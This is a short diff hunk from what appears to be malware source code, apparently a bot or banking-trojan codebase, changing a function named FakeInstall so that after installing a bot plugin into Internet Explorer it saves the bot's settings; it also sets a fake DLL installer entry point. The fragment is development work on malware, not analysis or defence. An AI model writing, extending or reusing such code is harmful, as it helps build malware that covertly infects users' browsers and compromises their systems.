@@ -627,7 +627,10 @@ BOOL WINAPI FakeInstall(
 		"Started BotPlugName='%s' Target='%s' InstallerBody=0x%X InstallerBodySize=%u", 
 		BotPlugName, Target, InstallerBody, InstallerBodySize);
 
-	return InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);
+	DWORD res = InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);
+	if( res )
+		BOT::SaveSettings(true, false, false);
+	return res;
 }
 
 #pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )
